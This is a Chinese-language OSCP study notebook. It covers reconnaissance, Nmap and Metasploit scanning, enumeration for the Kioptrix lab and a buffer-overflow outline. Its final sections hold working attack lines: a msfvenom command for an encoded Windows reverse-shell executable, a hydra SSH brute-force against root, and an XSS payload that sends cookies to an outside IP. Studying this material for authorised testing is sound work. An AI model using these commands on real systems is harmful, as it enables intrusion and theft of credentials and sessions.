# OSCP笔记  

## 第一件事情：改root密码  
root@kali:/# passwd  


## 常用命令  
pwd, man, ls, cd, mkdir, rmdir, cp, mv, locate, adduser, su, sudo, echo, cat, vim, chmod, ifconfig, ping  


## 常用服务  
apache2, ssh, postgresql

kali> service apache2 start  
kali> systemctl enable apache2  


## 信息收集  
Google (inurl:cnn.com, filetype:pdf, intext, .etc)  
Exploit-DB / Google Hacking DB  
shodan  
WHOIS  
Netcraft  
theharvester  


## 扫描  
TCP vs UDP  

### Nmap  
> 选项：-vv详细，-Pn不论是否存活一律扫描，-A综合扫描，-sS SYN扫描，-sU UDP扫描，-T4扫描速度（1慢，5快），-p指定端口，-p-所有端口，-oN输出格式，--script使用脚本扫描  

kali> nmap -vv -sS -Pn -A -p 1-65535 -T4 -oN /root/tcpscan.txt 192.168.X.X/24              # TCP SYN扫描  
kali> nmap -vv -sU -Pn -A -top-ports 200 -T4 -oN /root/udpscan.txt 192.168.X.X/24          # UDP扫描  
kali> nmap -vv -p 137 --script=all 192.168.X.X                                    # 对137端口跑脚本  

### Nessus  
kali> dpkg -i <Nessus安装包\>.deb     # 安装  
kali> /etc/init.d/nessusd start     # 启动  

### Metasploit  
kali> msfconsole     # 启动msf  
msf> search portscan        # 查找模块  
msf> use auxilary/...       # 使用  
msf> show options           # 查看模块信息  
msf> set ports 1-65535      # 设置参数  
msf> set rhosts 192.168.15.2  
msf> set threads 10  
msf> exploit                # 开始  



## Kioptrix Level 1  

### SSH信息枚举（SSH版本）  
查看版本，然后去`searchsploit`或exploit-db找漏洞  

### HTTP信息枚举（Web Server版本，目录，文件等）  
1. 查看网页源码  
2. 查看HTTP通信流量  
3. 目录扫描（dirbuster, nikto，御剑）  

字典：github: dirbuster wordlist  

### SMB信息枚举（OS版本，SMB版本，$IPC等）  
kali> enum4linux  
msf> use auxiliary/scanner/smb/smb_version  
kali> nbtscan  
kali> smbclient  

### DNS枚举  
kali> host [-t [ns|mx]] zonetransfer.me  
kali> host -l <url> <ns>     # DNS Zone Transfer  
kali> dnsrecon  
kali> dnsenum  



## 栈溢出（Buffer Overflow）

        |--------|      |---------|    
        |  Text  |      |   ESP   |
        |--------|      |---------|
        |  Data  |      |  Buffer | 
        |--------|      |    ↓    |
        |  Heap  |      |         |
        |   ↓    |   /  |---------|
        |        |  /   |   EBP   |         
        |--------| /    |---------|
        |        |      |   EIP   |
        |   ↑    |      |---------|
        | Stack  |      |   arg2  |
        |--------| \    |---------|
        | Kernel |  \   |   arg1  |
        |--------|   \  |---------|

1. Fuzzing (and finding badchars)  
2. Finding the offset  
3. Overwriting the EIP  
4. exploit with shellcode generated by `msfvenom`  

生成shellcode  
kali> msfvenom -p windows/shell_reverse_tcp LHOST=X.X.X.X LPORT=4444 EXITFUNC=thread -f python/c/exe -a x86 --platform windows -e x86/shikata_ga_nai -x ... -o a.exe  

检查恶意程序的网站  
https://www.virustotal.com/  


### Client Side Attacks（客户端攻击）  

通过PDF、浏览器、Java Applet漏洞攻击，结合社工工具setools  




## Online Password Attacks  
  
> The last thing to try  
  
暴力破解SSH
kali> hydra -v -l root -P /usr/share/wordlists/rockyou.txt X.X.X.X ssh -t 4s  



## Web Attacks

### XSS
> 窃取cookie
```js
<script>location.href='http://192.168.1.100/index.php?test='+document.cookie;<script/>
```


